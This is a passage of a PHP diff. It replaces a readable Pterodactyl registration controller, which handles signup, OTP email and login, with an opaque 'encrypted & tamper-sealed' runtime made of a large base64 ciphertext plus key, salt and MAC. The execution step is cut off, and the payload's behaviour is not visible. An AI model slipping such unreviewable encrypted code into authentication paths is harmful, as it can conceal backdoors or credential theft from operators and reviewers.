@@ -1,288 +1,38 @@
 <?php
+/**
+ * LUNAR PANEL — ENCRYPTED & TAMPER-SEALED CORE RUNTIME
+ * Copyright (c) 2026 Lunar Panel / Votion Cloud. All rights reserved.
+ * UNAUTHORIZED MODIFICATION OR EXTRACTION OF THIS FILE VOIDS ALL SYSTEM LICENSES.
+ */
+declare(strict_types=1);
 
-namespace Pterodactyl\Http\Controllers\Auth;
+(function () {
+    $p = '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';
+    $k = hex2bin('97a8e83ad9448dc3146b6fe904bbac2a10c9350ea5e29d730cbb5a019a305430');
+    $s = hex2bin('e3b50c47ba248b4a48daa3a2c55badeaa0e1ff9c197f99cc0c1daeb397c8acd6');
+    $m = '87c9b281cab9a3e965792e5a164eea9149f84b8b4ff23f1eb23eacc5b9d9ff2c';
 
-use Exception;
-use Ramsey\Uuid\Uuid;
-use Illuminate\Support\Str;
-use Illuminate\Http\Request;
-use Pterodactyl\Models\User;
-use Illuminate\Http\JsonResponse;
-use Pterodactyl\Facades\Activity;
-use Illuminate\Support\Facades\Auth;
-use Illuminate\Support\Facades\Hash;
-use Illuminate\Support\Facades\Mail;
-use Illuminate\Support\Facades\Cache;
-use Illuminate\Support\Facades\Log;
-use Pterodactyl\Http\Controllers\Controller;
-
-class RegisterController extends Controller
-{
-    /**
-     * Handle initial registration request: validates details, generates 6-digit OTP,
-     * stores payload in cache for 15 minutes, and delivers verification email via SMTP.
-     */
-    public function register(Request $request): JsonResponse
-    {
-        $validated = $request->validate([
-            'name' => 'required|string|max:191',
-            'email' => 'required|email|max:191',
-            'password' => 'required|string|min:8',
-        ]);
-
-        $email = strtolower(trim($validated['email']));
-        $name = trim($validated['name']);
-        $password = $validated['password'];
-
-        // Check if an account already exists with this email
-        if (User::query()->where('email', $email)->exists()) {
-            return new JsonResponse([
-                'success' => false,
-                'error' => 'An account with this email address already exists. Please log in instead.',
-            ], 422);
-        }
-
-        // Determine if registration requires email OTP verification
-        $otpEnabled = filter_var(config('pterodactyl.auth.registration_otp_enabled', true), FILTER_VALIDATE_BOOLEAN);
-
-        if (!$otpEnabled) {
-            $user = $this->createUserRecord($name, $email, Hash::make($password));
-
-            // Authenticate the user directly into the panel session
-            Auth::login($user, true);
-            $request->session()->regenerate();
-
-            return new JsonResponse([
-                'success' => true,
-                'verificationRequired' => false,
-                'user' => [
-                    'id' => $user->id,
-                    'uuid' => $user->uuid,
-                    'username' => $user->username,
-                    'email' => $user->email,
-                    'name' => $user->name,
-                    'role' => 'client',
-                ],
